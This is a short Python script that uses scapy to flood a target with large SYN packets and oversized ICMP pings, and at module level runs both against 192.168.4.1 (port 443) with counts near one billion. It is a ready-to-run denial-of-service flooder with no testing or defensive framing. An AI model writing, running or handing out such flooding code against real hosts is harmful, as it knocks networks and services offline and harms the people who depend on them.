from scapy.layers.inet import IP, TCP, ICMP
from scapy.packet import Raw
from scapy.sendrecv import send
from scapy.volatile import RandShort

def send_syn(target_ip_address: str, target_port: int, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
    ip = IP(dst=target_ip_address)
    tcp = TCP(sport=RandShort(), dport=target_port, flags="S")
    raw = Raw(b"X" * size_of_packet)

    p = ip / tcp / raw

    send(p, count=number_of_packets_to_send, verbose=1)

    print(f"[*] SYN: Sent {number_of_packets_to_send} packets, {size_of_packet} size to {target_ip_address} on port {target_port}\n")


def send_ping(target_ip_address: str, number_of_packets_to_send: int = 4, size_of_packet: int = 65000):
    ip = IP(dst=target_ip_address)
    icmp = ICMP()
    raw = Raw(b"X" * size_of_packet)
    p = ip / icmp / raw

    send(p, count=number_of_packets_to_send, verbose=1)

    print(f"[*] PING: Sent {number_of_packets_to_send} pings, {size_of_packet} size to {target_ip_address}\n")

ip = "192.168.4.1"
port = 443
send_syn(ip, port, number_of_packets_to_send=999999999)
send_ping(ip, number_of_packets_to_send=999999999)